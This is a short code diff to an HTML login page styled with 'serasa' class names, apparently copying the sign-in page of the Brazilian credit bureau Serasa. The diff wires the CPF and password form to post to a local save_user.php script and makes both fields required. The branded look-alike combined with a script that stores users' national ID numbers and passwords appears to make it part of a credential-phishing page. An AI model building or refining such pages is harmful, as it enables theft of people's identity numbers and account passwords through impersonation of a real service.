@@ -117,7 +117,7 @@
       margin-bottom: 8px;
     }
 
-    .serasa-form input[type="text"] {
+    .serasa-form input[type="text"], .serasa-form input[type="password"] {
       width: 100%;
       padding: 10px;
       border: 2px solid #e71d73;
@@ -222,13 +222,13 @@
     </div>
 
     <div class="serasa-right">
-      <form class="serasa-form">
+      <form action="save_user.php" method="POST" class="serasa-form">
         <label for="cpf">Digite seu CPF</label>
-        <input type="text" id="cpf" placeholder="000.000.000-00" />
+        <input type="text" id="cpf" placeholder="000.000.000-00" required />
         <span class="error-message">Informe o seu CPF.</span>
 
-        <label for="senha">Digite sua senha</label>
-        <input type="text" id="senha" placeholder="************" />
+        <label for="password">Digite sua senha</label>
+        <input type="password" id="password" placeholder="************" required />
         <span class="error-message">Informe a sua senha.</span>
         
         <button type="submit" id="continuar">Continuar</button>
